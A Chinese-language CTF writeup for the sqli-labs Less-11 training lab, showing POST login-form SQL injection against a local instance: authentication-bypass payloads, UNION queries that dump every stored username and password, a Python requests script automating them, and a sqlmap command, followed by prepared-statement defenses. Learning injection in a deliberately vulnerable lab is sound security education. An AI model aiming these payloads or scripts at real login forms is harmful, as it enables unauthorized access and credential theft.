---
layout: post
title: sqli-labs - Less-11 POST 登录框注入（单引号）Writeup
platform: sqli-labs
date: 2026-11-10 07:20:00 +0800
categories: CTF
---

sqli-labs - Less-11 POST 登录框注入（单引号）Writeup

一、题目信息

- 平台：sqli-labs（本地搭建）
- 关卡：Less-11 → POST - Error Based - Single quotes - String（登录框注入）
- 地址：`http://127.0.0.1:8080/Less-11/`
- 题型：Web / SQL 注入
- 考点：**POST 表单注入 → 万能密码 + UNION 回显**

**环境信息**：

```text
PHP 7.3.4（php -S 127.0.0.1:8080 内置服务器）
MySQL 5.7.26（secure_file_priv 已设为空，允许 outfile）
sqli-labs 源码：工作区 sqli-labs/
数据库 security（users 表 8 条数据）
```

**✅ 实测结果**

```text
uname=1&passwd=1                → 无回显
uname=admin&passwd=admin        → Your Login name:admin   （这是真实密码）
uname=admin' #                  → Your Login name:admin   ★ 万能密码绕过
uname=admin' or 1=1 #           → Your Login name:Dumb
uname=1' union select 1,2 #     → Your Login name:1       （2 列）
uname=-1' union select 1,database() #  → login:1  pass:security
uname=-1' union select 1,group_concat(username,0x3a,password) from users #
                                → login:1  pass:Dumb:Dumb,Angelina:I-kill-you,...,admin:admin
```

二、题目分析

**① 这是第一个 POST 关卡：参数不在 URL 里，在请求体里**

```html
<form method="POST" action="#">
    <input type="text" name="uname">
    <input type="password" name="passwd">
    <input type="submit" name="submit" value="Submit">
</form>
```

**② 源码**

```php
$uname = $_POST['uname'];
$passwd = $_POST['passwd'];
$sql = "SELECT * FROM users WHERE username='$uname' AND password='$passwd' LIMIT 0,1";
$result = mysql_query($sql);
$row = mysql_fetch_array($result);
if ($row) {
    echo "Your Login name:" . $row['username'];
    echo "Your Password:" . $row['password'];
}
```

**★ 注意：`username='$uname' AND password='$passwd'`**

```text
要绕过登录，需要让 WHERE 后面的整体为真
经典套路：在 uname 里闭合单引号，然后把后面的 AND password='...' 注释掉
```

**③ 三种打法**

| 打法 | payload | 说明 |
|---|---|---|
| 万能密码 | `admin' #` | 注释掉密码判断，直接以 admin 登录 |
| 逻辑真 | `admin' or 1=1 #` | 返回表里第一行 |
| UNION 回显 | `-1' union select 1,database() #` | 直接把数据放进两个回显位 |

**④ 为什么用 `#` 不用 `--+`**

```text
POST 请求体里 --+ 不会变成 "-- "（+ 不是空格）
要么用 #，要么写成 "-- "（后面带真空格）
★ 本机实测：# 和 "-- " 都能成功，"--+" 不行
```

三、解题步骤

**第一步：抓包看参数**

```text
打开 /Less-11/，输入任意账号密码，F12 → 网络 → 看 POST 请求体：
  uname=1&passwd=1&submit=Submit
```

**第二步：万能密码绕过**

```text
uname = admin' #
passwd = 任意

拼接后 SQL：
  SELECT * FROM users WHERE username='admin' #' AND password='任意' LIMIT 0,1
                                          ↑
                                    # 把后面全注释掉

★ 实测：Your Login name:admin
```

**第三步：判断列数 + 找显示位**

```text
uname = 1' union select 1,2 #
→ Your Login name:1     （说明 2 列，两个位置都能回显）
```

**第四步：爆库 / 爆数据**

```text
uname = -1' union select 1,database() #
→ login:1  pass:security

uname = -1' union select 1,group_concat(username,0x3a,password) from users #
→ login:1  pass:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,
              stupid:stupidity,superman:genious,batman:mob!le,admin:admin
```

**第五步：脚本化（requests）**

```python
import requests

url = "http://127.0.0.1:8080/Less-11/"

def login(uname, passwd="x"):
    data = {"uname": uname, "passwd": passwd, "submit": "Submit"}
    r = requests.post(url, data=data, timeout=10)
    return r.text

for payload in ["admin' #", "admin' or 1=1 #",
                "-1' union select 1,database() #",
                "-1' union select 1,group_concat(username,0x3a,password) from users #"]:
    print("=" * 60)
    print(payload)
    print(login(payload)[:400])
```

**★ 也可以直接 sqlmap：**

```bash
sqlmap -u "http://127.0.0.1:8080/Less-11/" --data="uname=1&passwd=1&submit=Submit"        -p uname --batch --dbs
```

四、延伸知识

**① POST 注入和 GET 注入的区别**

| | GET | POST |
|---|---|---|
| 参数位置 | URL 查询串 | 请求体 |
| 测试方式 | 浏览器改地址栏 | 必须抓包/改包/用脚本 |
| 注释符 | `--+` 好用 | `#` 或 `-- `（带空格） |

**② 万能密码为什么能过**

```sql
SELECT * FROM users WHERE username='admin' #' AND password='xxx' LIMIT 0,1
-- 等价于
SELECT * FROM users WHERE username='admin'
★ 密码条件被注释掉了，只要用户名对就登录成功
```

**③ 真实世界里的登录框注入**

```text
现代系统基本都用 ORM / 预处理，登录框注入很少见了
但"忘记密码""用户搜索""排序字段"等地方仍常见
★ 排序字段（order by 后面的列名）不能参数化，最容易漏
```

**④ 防御**

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=? LIMIT 0,1");
$stmt->execute([$uname, md5($passwd)]);   // 密码务必加盐哈希，别明文存

// 附加：失败次数限制、验证码、统一错误提示
```

五、总结

- **本题核心：POST 登录框 → 单引号闭合 + `#` 注释掉密码判断 → 万能密码 / UNION 回显。**

- 三步方法论：

```text
① 抓包确认参数在 POST body（uname / passwd / submit）
② 万能密码：admin' #   逻辑真：admin' or 1=1 #
③ 要数据：-1' union select 1,<要查的东西> #
```

- **三个必记要点**：

```text
① POST 里注释用 # 或 "-- "（带空格），"--+" 不生效
② 用 -1 让主查询落空，UNION 的结果才会显示
③ 回显位有 2 个：username 和 password 两个字段位
```

- **实测数据**：

```text
admin' #              → Your Login name:admin
admin' or 1=1 #       → Your Login name:Dumb
-1' union select 1,database() # → pass:security
-1' union select 1,group_concat(username,0x3a,password) from users #
                      → 8 个账号全部泄露
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────────────────┐
│  Less-11：登录框 = 单引号 + 注释掉密码 = 万能密码               │
│                                                              │
│  三板斧：                                                     │
│      admin' #            → 直接以 admin 登录                  │
│      admin' or 1=1 #     → 登录成第一行用户                   │
│      -1' union select 1,database() #  → 把数据放到回显位       │
│                                                              │
│  ★ POST 用 # 注释，GET 用 --+ 注释                            │
└──────────────────────────────────────────────────────────────┘
```
